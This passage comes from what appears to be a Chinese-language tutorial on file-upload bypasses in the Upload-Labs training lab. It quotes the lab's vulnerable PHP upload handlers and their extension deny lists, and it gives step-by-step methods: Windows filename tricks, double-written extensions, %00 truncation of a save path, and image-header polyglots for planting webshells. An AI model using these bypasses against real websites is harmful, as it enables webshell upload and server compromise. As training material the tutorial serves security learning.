class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果文件扩展名在禁止列表中，设置错误消息为“此文件类型不允许上传！”。</li></ul><h4 id="11-上传目录不存在"><a href="#11-上传目录不存在" class="headerlink" title="11. 上传目录不存在"></a>11. 上传目录不存在</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果上传目录<code>UPLOAD_PATH</code>不存在，设置错误消息为“文件夹不存在，请手工创建！”。</li></ul><h2 id="2-5-11-利用-windows-环境的叠加特征绕过上传"><a href="#2-5-11-利用-windows-环境的叠加特征绕过上传" class="headerlink" title="2.5.11 利用 windows 环境的叠加特征绕过上传"></a>2.5.11 利用 windows 环境的叠加特征绕过上传</h2><h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><p>首先抓包上传 a.php:.jpg（php文件） 上传会在目录里生成 a.php 空白文件，接着再次提交把a.php 改成 a.&gt;&gt;&gt;</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>在 windwos 中如果上传文件名 moonsec.php:.jpg 的时候，会在目录下生产空白的文件名 moonsec.php</p><p>再利用 php 和 windows 环境的叠加属性，</p><p>以下符号在正则匹配时相等</p><p>双引号” 等于 点号.</p><p>大于符号&gt; 等于 问号?</p><p>小于符号&lt; 等于 星号*</p><p>文件名.&lt;或文件名.&lt;&lt;&lt;或文件名.&gt;&gt;&gt;或文件名.&gt;&gt;&lt;空文件名</p><h3 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h3><p>pass-10<br>同样是黑名单匹配，把.去掉，大小写过滤， 把空格也过滤了。::$data 也过滤了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-12-双写后缀名绕过上传"><a href="#2-5-12-双写后缀名绕过上传" class="headerlink" title="2.5.12 双写后缀名绕过上传"></a>2.5.12 双写后缀名绕过上传</h2><h3 id="双写后缀名绕过上传方法"><a href="#双写后缀名绕过上传方法" class="headerlink" title="双写后缀名绕过上传方法"></a>双写后缀名绕过上传方法</h3><p>抓包上传，把后缀名改成 pphphp 即可绕过上传</p><h3 id="双写后缀名绕过上传原理"><a href="#双写后缀名绕过上传原理" class="headerlink" title="双写后缀名绕过上传原理"></a>双写后缀名绕过上传原理</h3><p>在上传模块，有的代码会把黑名单的后缀名替换成空，例如 a.php 会把 php 替换成空，但是可以使用双写绕过例如 asaspp，pphphp，即可绕过上传。</p><h3 id="双写后缀名绕过上传代码分析"><a href="#双写后缀名绕过上传代码分析" class="headerlink" title="双写后缀名绕过上传代码分析"></a>双写后缀名绕过上传代码分析</h3><p>同样是黑名单过滤。str_ireplace 对上传的后缀名是黑名单内的字符串转换成空。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-13-目录可控-00-截断绕过上传"><a href="#2-5-13-目录可控-00-截断绕过上传" class="headerlink" title="2.5.13 目录可控%00 截断绕过上传"></a>2.5.13 目录可控%00 截断绕过上传</h2><p>如果黑名单上传检测后，没有限定后缀名，绕过的方法很多，与黑名单相对的就是白名单，使用白名单验证会相对比较安全，因为只允许指定的文件后缀名。但是如果有可控的参数目录，也存在被绕过的风险。</p><h3 id="目录可控-00-截断绕过上传方法"><a href="#目录可控-00-截断绕过上传方法" class="headerlink" title="目录可控%00 截断绕过上传方法"></a>目录可控%00 截断绕过上传方法</h3><p>上传参数可控</p><ul><li>当 gpc 关闭的情况下，可以用%00 对目录或者文件名进行截断。</li><li>php 版本小于 5.3.4</li></ul><p>首先截断攻击，抓包上传将%00 自动截断后门内容。</p><p>例如 1.php%00      1.php 变成 1.phpO</p><p>上传jpg文件，</p><p>在 Upload-Labs 第 12 关中，你需要上传一个 <strong>JPG 文件</strong>，但通过漏洞绕过文件类型限制，使其被服务器解析为 PHP 文件。以下是详细解释和操作步骤：</p><h3 id="为什么上传-JPG-文件？"><a href="#为什么上传-JPG-文件？" class="headerlink" title="为什么上传 JPG 文件？"></a>为什么上传 JPG 文件？</h3><ol><li><strong>绕过文件类型限制</strong>：该关卡的代码通常会检查文件扩展名，只允许上传特定的图片格式（如 JPG、PNG 等），而阻止上传 PHP 文件。</li><li><strong>利用 <code>%00</code> 截断漏洞</strong>：通过在文件名中插入 <code>%00</code>（NULL 字符），可以截断文件名的扩展名，从而绕过文件类型检查。</li></ol><h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><h4 id="1-准备文件"><a href="#1-准备文件" class="headerlink" title="1. 准备文件"></a>1. 准备文件</h4><ul><li>创建一个包含 PHP 代码的文件，例如 <code>shell.php</code>，内容可以是：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>将文件扩展名改为 <code>.jpg</code>，例如 <code>shell.jpg</code>。这样文件看起来是一个 JPG 文件，但实际上内容是 PHP 代码。</li></ul><h4 id="2-抓包并修改请求"><a href="#2-抓包并修改请求" class="headerlink" title="2. 抓包并修改请求"></a>2. 抓包并修改请求</h4><ul><li>使用 Burp Suite 或其他抓包工具拦截上传请求。</li><li>在请求中找到文件名字段（通常是 <code>filename</code> 或类似字段），将其值改为 <code>shell.jpg%00</code>。</li><li>确保文件内容是 PHP 代码，而不是真正的 JPG 图片内容。</li></ul><h4 id="3-修改保存路径"><a href="#3-修改保存路径" class="headerlink" title="3. 修改保存路径"></a>3. 修改保存路径</h4><ul><li>在抓包的请求中，找到 <code>save_path</code> 参数（或类似参数），将其值改为 <code>../upload/shell.php%00</code>。</li><li>这里的 <code>%00</code> 是关键，它会在文件保存时被截断，最终保存为 <code>shell.php</code>。</li></ul><h4 id="4-上传并验证"><a href="#4-上传并验证" class="headerlink" title="4. 上传并验证"></a>4. 上传并验证</h4><ul><li>发送修改后的请求，上传文件。</li><li>访问 <code>http://127.0.0.1/upload/shell.php</code>，如果成功执行了 PHP 代码（如显示 <code>phpinfo()</code> 的内容），则说明攻击成功。</li></ul><h3 id="关键点总结"><a href="#关键点总结" class="headerlink" title="关键点总结"></a>关键点总结</h3><ul><li><strong>文件类型</strong>：上传的是 <code>.jpg</code> 文件，但内容是 PHP 代码。</li><li><strong>文件名截断</strong>：通过在文件名中添加 <code>%00</code>，绕过文件扩展名限制。</li><li><strong>保存路径</strong>：通过修改保存路径，确保文件被保存为 <code>.php</code> 文件。</li></ul><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>确保 PHP 版本低于 5.3.4，因为 <code>%00</code> 截断漏洞在更高版本中可能无效。</li><li>如果服务器对文件内容进行了 MIME 类型检查，可能需要在文件开头添加一些 JPG 文件的特征字节（如 <code>FFD8</code>），但通常这种检查在 Upload-Labs 中不会太严格。</li></ul><p>希望这些信息对你有帮助！</p><h3 id="目录可控-00-截断绕过上传原理"><a href="#目录可控-00-截断绕过上传原理" class="headerlink" title="目录可控%00 截断绕过上传原理"></a>目录可控%00 截断绕过上传原理</h3><ul><li><p>该关卡的代码通过 <code>$_GET[&#39;save_path&#39;]</code> 拼接文件路径，并使用 <code>move_uploaded_file</code> 函数保存文件。</p></li><li><p>当 PHP 版本小于 5.3.4 且 <code>magic_quotes_gpc</code> 关闭时，<code>%00</code> 会被解析为字符串终止符，导致文件名截断。</p></li><li><p>通过在文件名中添加 <code>%00</code>，可以绕过文件扩展名的白名单限制。</p></li></ul><h3 id="目录可控-00-截断绕过上传代码分析"><a href="#目录可控-00-截断绕过上传代码分析" class="headerlink" title="目录可控%00 截断绕过上传代码分析"></a>目录可控%00 截断绕过上传代码分析</h3><p>代码中使用白名单限制上传的文件后缀名，只允许指定的图片格式。但是$ _GET[‘save_path’]服务器接受客户端的值，这个值可被客户端修改。所以会留下安全问题。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-14-目录可控-POST-绕过上传"><a href="#2-5-14-目录可控-POST-绕过上传" class="headerlink" title="2.5.14 目录可控 POST 绕过上传"></a>2.5.14 目录可控 POST 绕过上传</h2><h3 id="目录可控-POST-绕过上传方法"><a href="#目录可控-POST-绕过上传方法" class="headerlink" title="目录可控 POST 绕过上传方法"></a>目录可控 POST 绕过上传方法</h3><p>文件名可控，通过抓包修改可控的参数，与不同的中间件的缺陷配合使用。</p><ul><li>使用%00 截断文件名 再 post 环境下%00 要经过 decode 但是受 gpc 限制</li></ul><p>使用 burpsutie POST %00 截断文件名</p><p>如果目录当前目录不能解析脚本，可以移动到其他目录再进行截断提交。</p><h3 id="目录可控-POST-绕过上传原理"><a href="#目录可控-POST-绕过上传原理" class="headerlink" title="目录可控 POST 绕过上传原理"></a>目录可控 POST 绕过上传原理</h3><p>上节是 GET 请求的，可以直接在 url 输入%00 即可截断，但是在 post 下直接注入%00 是不行的，需要把%00解码变成空白符，截断才有效。才能把目录截断成文件名</p><h3 id="目录可控-POST-绕过上传代码分析"><a href="#目录可控-POST-绕过上传代码分析" class="headerlink" title="目录可控 POST 绕过上传代码分析"></a>目录可控 POST 绕过上传代码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-15-文件头检测绕过上传"><a href="#2-5-15-文件头检测绕过上传" class="headerlink" title="2.5.15 文件头检测绕过上传"></a>2.5.15 文件头检测绕过上传</h2><h3 id="文件头检测绕过上传方法"><a href="#文件头检测绕过上传方法" class="headerlink" title="文件头检测绕过上传方法"></a>文件头检测绕过上传方法</h3><p>1.制作图片一句话，使用 copy 1.gif&#x2F;b+moon.php shell.php 将 php 文件附加再 jpg 图片上，直接上传即可</p><p>（本例子因为限制了后缀为 jpg，可以考虑文件包含将图片文件包含进去 getshell</p><p>burpsuite 上传的数据包头加上 GIF89a）</p><h3 id="文件头检测绕过上传原理"><a href="#文件头检测绕过上传原理" class="headerlink" title="文件头检测绕过上传原理"></a>文件头检测绕过上传原理</h3><p>有的文件上传，上传时候会检测头文件，不同的文件，头文件也不尽相同。常见的文件上传图片头检测 它检测图片是两个字节的长度，如果不是图片的格式，会禁止上传。<br>常见的文件头</p><ul><li>JPEG (jpg)，文件头：FFD8FF</li><li>PNG (png)，文件头：89504E47</li><li>GIF (gif)，文件头：47494638</li><li>TIFF (tif)，文件头：49492A00</li><li>Windows Bitmap (bmp)，文件头：424D</li></ul><h3 id="文件头检测绕过上传代码分析"><a href="#文件头检测绕过上传代码分析" class="headerlink" title="文件头检测绕过上传代码分析"></a>文件头检测绕过上传代码分析</h3><p>这个是存在文件头检测的上传，getReailFileType 是检测 jpg、png、gif 的文件头<br>如果上传的文件符合数字即可通过检测。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-16-图片检测函数绕过上传"><a href="#2-5-16-图片检测函数绕过上传" class="headerlink" title="2.5.16 图片检测函数绕过上传"></a>2.5.16 图片检测函数绕过上传</h2><h3 id="图片检测函数绕过上传方法"><a href="#图片检测函数绕过上传方法" class="headerlink" title="图片检测函数绕过上传方法"></a>图片检测函数绕过上传方法</h3><p>用文件包含漏洞引入 jpeg 图片即可 getshell</p><h3 id="图片检测函数绕过上传原理"><a href="#图片检测函数绕过上传原理" class="headerlink" title="图片检测函数绕过上传原理"></a>图片检测函数绕过上传原理</h3><h3 id="图片检测函数绕过上传代码分析"><a href="#图片检测函数绕过上传代码分析" class="headerlink" title="图片检测函数绕过上传代码分析"></a>图片检测函数绕过上传代码分析</h3><p>pass-15<br>getimagesize 是获取图片的大小，如果头文件不是图片会报错直接可以用图片马绕过检测。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span 